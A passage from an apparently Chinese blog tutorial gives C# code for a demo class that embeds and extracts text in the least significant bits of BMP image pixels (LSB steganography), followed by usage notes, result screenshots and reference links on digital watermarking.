punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>LSBHelper代码</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>IO<span class="token punctuation">;</span><span class="token keyword">namespace</span> LSBAlgorithmDemo<span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LSBHelper</span>    <span class="token punctuation">{</span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 定义全局变量</span>        FileStream fileReadStream <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        MemoryStream memStream <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        BinaryReader br <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 用于判断图片是否为Bitmap格式</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// 用于判断图片是否为Bitmap格式</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="imgFormat">图片前几个字节&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;returns>返回判断结果&lt;/returns></span>        <span class="token keyword">private</span> <span class="token keyword">bool</span> <span class="token function">IsBitmap</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> imgFormat<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 判断类型表示字节是否为2</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>imgFormat<span class="token punctuation">.</span>Length <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// 判断标识字节是否为：42 4d</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>imgFormat<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0x42</span> <span class="token operator">&amp;&amp;</span> imgFormat<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0x4d</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    <span class="token comment" spellcheck="true">// 是Bitmap</span>                    <span class="token keyword">return</span> <span class="token keyword">true</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">else</span>                <span class="token punctuation">{</span>                    <span class="token keyword">return</span> <span class="token keyword">false</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token keyword">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 判断文本信息能否写入图片中</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// 判断文本信息能否写入图片中</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="streamSize">图片流的字节个数&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;param name="infoSize">文本信息的字符个数&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;returns>返回判断结果&lt;/returns></span>        <span class="token keyword">private</span> <span class="token keyword">bool</span> <span class="token function">CanEmbed</span><span class="token punctuation">(</span><span class="token keyword">long</span> streamSize<span class="token punctuation">,</span> <span class="token keyword">long</span> infoSize<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>streamSize <span class="token operator">&lt;</span> <span class="token punctuation">(</span>infoSize <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span> <span class="token number">54</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token keyword">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token keyword">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 判断指定文件是否存在</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// 判断指定文件是否存在</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="fullFileName">文件全名称&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;returns>返回判断结果&lt;/returns></span>        <span class="token keyword">private</span> <span class="token keyword">bool</span> <span class="token function">IsFileExists</span><span class="token punctuation">(</span><span class="token keyword">string</span> fullFileName<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> File<span class="token punctuation">.</span><span class="token function">Exists</span><span class="token punctuation">(</span>fullFileName<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 判断图像中是否写入信息</span>        <span class="token keyword">private</span> <span class="token keyword">bool</span> <span class="token function">IsEmabed</span><span class="token punctuation">(</span>MemoryStream memorystream<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 复位</span>            memorystream<span class="token punctuation">.</span>Position <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            memorystream<span class="token punctuation">.</span><span class="token function">Seek</span><span class="token punctuation">(</span>54L<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">byte</span> reader<span class="token punctuation">;</span>            <span class="token keyword">char</span> ch<span class="token punctuation">;</span>            <span class="token keyword">int</span> temp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> state <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>index <span class="token operator">=</span> memorystream<span class="token punctuation">.</span><span class="token function">ReadByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> index <span class="token operator">!=</span> memorystream<span class="token punctuation">.</span>Length<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                temp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    reader <span class="token operator">=</span> Convert<span class="token punctuation">.</span><span class="token function">ToByte</span><span class="token punctuation">(</span>memorystream<span class="token punctuation">.</span><span class="token function">ReadByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    temp <span class="token operator">+</span><span class="token operator">=</span> <span class="token punctuation">(</span>reader <span class="token operator">&amp;</span> <span class="token number">0x01</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> k<span class="token punctuation">;</span>                <span class="token punctuation">}</span>                ch <span class="token operator">=</span> Convert<span class="token punctuation">.</span><span class="token function">ToChar</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>ch <span class="token operator">==</span> <span class="token string">'#'</span><span class="token punctuation">)</span>                    state<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>state <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token keyword">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token keyword">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 将待写入图片的信息转成</span><span class="token string">"# + info + #"</span>的格式并储存在tempChs字符数组中        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// 将待写入图片的信息转成"# + info + #"的格式并储存在tempChs字符数组中</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="info">&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;returns>&lt;/returns></span>        <span class="token keyword">private</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">GetTempChsFromInfo</span><span class="token punctuation">(</span><span class="token keyword">string</span> info<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 将文本信息转成Unicode字符值并存储在char数组中</span>            <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> infoToChs <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">char</span><span class="token punctuation">[</span>info<span class="token punctuation">.</span>Length<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> info<span class="token punctuation">.</span>Length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                infoToChs<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> Convert<span class="token punctuation">.</span><span class="token function">ToChar</span><span class="token punctuation">(</span>info<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// 将待写入图片的信息转成指定格式并储存在tempChs字符数组中</span>            <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> tempChs <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">char</span><span class="token punctuation">[</span><span class="token punctuation">(</span>info<span class="token punctuation">.</span>Length <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 前导符“#”：16位</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> n <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> n <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> n<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                tempChs<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> Convert<span class="token punctuation">.</span><span class="token function">ToChar</span><span class="token punctuation">(</span><span class="token number">0x0001</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token string">'#'</span> <span class="token operator">></span><span class="token operator">></span> n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// 原主要信息</span>            <span class="token keyword">int</span> k<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>k <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> infoToChs<span class="token punctuation">.</span>Length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> n <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> n <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> n<span class="token operator">++</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    tempChs<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">*</span> k <span class="token operator">+</span> n<span class="token punctuation">]</span> <span class="token operator">=</span> Convert<span class="token punctuation">.</span><span class="token function">ToChar</span><span class="token punctuation">(</span><span class="token number">0x0001</span> <span class="token operator">&amp;</span> infoToChs<span class="token punctuation">[</span>k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">></span><span class="token operator">></span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// 后导符“#”：16位</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> n <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> n <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> n<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                tempChs<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">*</span> k <span class="token operator">+</span> n<span class="token punctuation">]</span> <span class="token operator">=</span> Convert<span class="token punctuation">.</span><span class="token function">ToChar</span><span class="token punctuation">(</span><span class="token number">0x0001</span> <span class="token operator">&amp;</span> <span class="token string">'#'</span> <span class="token operator">></span><span class="token operator">></span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> tempChs<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 向Bitmap中嵌入信息</span>        <span class="token keyword">public</span> <span class="token keyword">bool</span> <span class="token function">EmbedInfo</span><span class="token punctuation">(</span><span class="token keyword">string</span> fullFileName<span class="token punctuation">,</span> <span class="token keyword">string</span> info<span class="token punctuation">,</span> <span class="token keyword">out</span> <span class="token keyword">string</span> msg<span class="token punctuation">,</span> <span class="token keyword">out</span> MemoryStream memory<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 判断指定图片是否存在</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">IsFileExists</span><span class="token punctuation">(</span>fullFileName<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                msg <span class="token operator">=</span> <span class="token string">"请确认指定的图片是否存在"</span><span class="token punctuation">;</span>                memory <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token keyword">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">try</span>            <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// 得到图片的字节流读取器</span>                fileReadStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileStream</span><span class="token punctuation">(</span>fullFileName<span class="token punctuation">,</span> FileMode<span class="token punctuation">.</span>Open<span class="token punctuation">,</span> FileAccess<span class="token punctuation">.</span>Read<span class="token punctuation">)</span><span class="token punctuation">;</span>                br <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BinaryReader</span><span class="token punctuation">(</span>fileReadStream<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 读取图片的标识符</span>                <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> imgFormat <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                imgFormat<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> br<span class="token punctuation">.</span><span class="token function">ReadByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                imgFormat<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> br<span class="token punctuation">.</span><span class="token function">ReadByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                br<span class="token punctuation">.</span>BaseStream<span class="token punctuation">.</span>Position <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 判断指定图片是否为Bitmap格式</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">IsBitmap</span><span class="token punctuation">(</span>imgFormat<span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    msg <span class="token operator">=</span> <span class="token string">"请选择Bitmap格式的图片"</span><span class="token punctuation">;</span>                    memory <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                    <span class="token keyword">return</span> <span class="token keyword">false</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token comment" spellcheck="true">// 判断指定图片是否能够写下信息</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">CanEmbed</span><span class="token punctuation">(</span>fileReadStream<span class="token punctuation">.</span>Length<span class="token punctuation">,</span> info<span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    msg <span class="token operator">=</span> <span class="token string">"该图片无法写下指定的全部信息，请选择更大尺寸的Bitmap图片"</span><span class="token punctuation">;</span>                    memory <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                    <span class="token keyword">return</span> <span class="token keyword">false</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token comment" spellcheck="true">// 将待写入图片的信息转成指定格式并储存在tempChs字符数组中</span>                <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> tempChs <span class="token operator">=</span> <span class="token function">GetTempChsFromInfo</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 使用LSB算法将整合后的文件流写入内存流中</span>                memStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MemoryStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">byte</span> write<span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> fileReadStream<span class="token punctuation">.</span>Length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    write <span class="token operator">=</span> br<span class="token punctuation">.</span><span class="token function">ReadByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">// 前54字节不能动</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;=</span> <span class="token number">54</span><span class="token punctuation">)</span>                    <span class="token punctuation">{</span>                        memStream<span class="token punctuation">.</span><span class="token function">WriteByte</span><span class="token punctuation">(</span>write<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">else</span>   <span class="token comment" spellcheck="true">// 在数据区写入信息</span>                    <span class="token punctuation">{</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>j <span class="token operator">&lt;</span> tempChs<span class="token punctuation">.</span>Length<span class="token punctuation">)</span>                        <span class="token punctuation">{</span>                            memStream<span class="token punctuation">.</span><span class="token function">WriteByte</span><span class="token punctuation">(</span>Convert<span class="token punctuation">.</span><span class="token function">ToByte</span><span class="token punctuation">(</span><span class="token punctuation">(</span>write <span class="token operator">&amp;</span> <span class="token number">0xfe</span><span class="token punctuation">)</span> <span class="token operator">+</span> tempChs<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                        <span class="token keyword">else</span>                        <span class="token punctuation">{</span>                            memStream<span class="token punctuation">.</span><span class="token function">WriteByte</span><span class="token punctuation">(</span>write<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                        j<span class="token operator">++</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                memStream<span class="token punctuation">.</span>Position <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                msg <span class="token operator">=</span> <span class="token string">"信息已成功嵌入图片中"</span><span class="token punctuation">;</span>                memory <span class="token operator">=</span> memStream<span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token keyword">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> ex<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                msg <span class="token operator">=</span> ex<span class="token punctuation">.</span>Message<span class="token punctuation">;</span>                memory <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token keyword">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">finally</span>            <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// 执行完毕之后一定要关闭创建的资源</span>                fileReadStream<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//memStream.Close();</span>                br<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 提取Bitmap中的信息</span>        <span class="token keyword">public</span> <span class="token keyword">bool</span> <span class="token function">ExtractInfo</span><span class="token punctuation">(</span>MemoryStream memorystream<span class="token punctuation">,</span> <span class="token keyword">out</span> <span class="token keyword">string</span> info<span class="token punctuation">,</span> <span class="token keyword">out</span> <span class="token keyword">string</span> msg<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token preprocessor property">#<span class="token directive keyword">region</span> 读取图片的标识符并判断文件是否为指定类型</span>            <span class="token comment" spellcheck="true">// 读取图片的标识符</span>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> imgFormat <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            imgFormat<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> Convert<span class="token punctuation">.</span><span class="token function">ToByte</span><span class="token punctuation">(</span>memorystream<span class="token punctuation">.</span><span class="token function">ReadByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            imgFormat<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> Convert<span class="token punctuation">.</span><span class="token function">ToByte</span><span class="token punctuation">(</span>memorystream<span class="token punctuation">.</span><span class="token function">ReadByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            memorystream<span class="token punctuation">.</span>Position <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 判断指定图片是否为Bitmap格式</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">IsBitmap</span><span class="token punctuation">(</span>imgFormat<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                info <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                msg <span class="token operator">=</span> <span class="token string">"请选择Bitmap格式的图片"</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token keyword">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>            <span class="token preprocessor property">#<span class="token directive keyword">region</span> 提取信息</span>            <span class="token comment" spellcheck="true">// 回位</span>            memorystream<span class="token punctuation">.</span>Position <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            memorystream<span class="token punctuation">.</span><span class="token function">Seek</span><span class="token punctuation">(</span>54L<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">byte</span> reader<span class="token punctuation">;</span>            <span class="token keyword">char</span> ch<span class="token punctuation">;</span>            <span class="token keyword">int</span> temp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> state <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            info <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span>Convert<span class="token punctuation">.</span><span class="token function">ToChar</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">'#'</span> <span class="token operator">||</span> state <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                temp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    reader <span class="token operator">=</span> Convert<span class="token punctuation">.</span><span class="token function">ToByte</span><span class="token punctuation">(</span>memorystream<span class="token punctuation">.</span><span class="token function">ReadByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    temp <span class="token operator">+</span><span class="token operator">=</span> <span class="token punctuation">(</span>reader <span class="token operator">&amp;</span> <span class="token number">0x01</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> k<span class="token punctuation">;</span>                <span class="token punctuation">}</span>                ch <span class="token operator">=</span> Convert<span class="token punctuation">.</span><span class="token function">ToChar</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>ch <span class="token operator">!=</span> <span class="token string">'#'</span> <span class="token operator">&amp;&amp;</span> state <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    info <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                    msg <span class="token operator">=</span> <span class="token string">"没有嵌入文字信息或者信息已经被破坏"</span><span class="token punctuation">;</span>                    <span class="token keyword">return</span> <span class="token keyword">false</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>ch <span class="token operator">!=</span> <span class="token string">'#'</span> <span class="token operator">&amp;&amp;</span> state <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    info <span class="token operator">+</span><span class="token operator">=</span> ch<span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>ch <span class="token operator">==</span> <span class="token string">'#'</span><span class="token punctuation">)</span>                    state<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            msg <span class="token operator">=</span> <span class="token string">"成功"</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">true</span><span class="token punctuation">;</span>            <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>注意点</strong>：</p><ol><li>流每次读取一次，位置就向后推进一定的位数，但可以使用Position属性设置开始读取的位置</li><li>MemoryStream对象的ReadByte()方法将返回的字节强制转换成Int32类型</li></ol><h1 id="结果展示"><a href="#结果展示" class="headerlink" title="结果展示"></a>结果展示</h1><p><strong>嵌入信息</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Algorithm/LSB/嵌入信息.png" alt="嵌入信息"></center><p><strong>提取信息</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Algorithm/LSB/提取信息.png" alt="提取信息"></center><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p><strong>参考链接</strong>：</p><p><a href="https://mp.weixin.qq.com/s/sgYKbf1VqjF-UvQiIDLzgQ" target="_blank" rel="noopener">数字水印</a></p><p><a 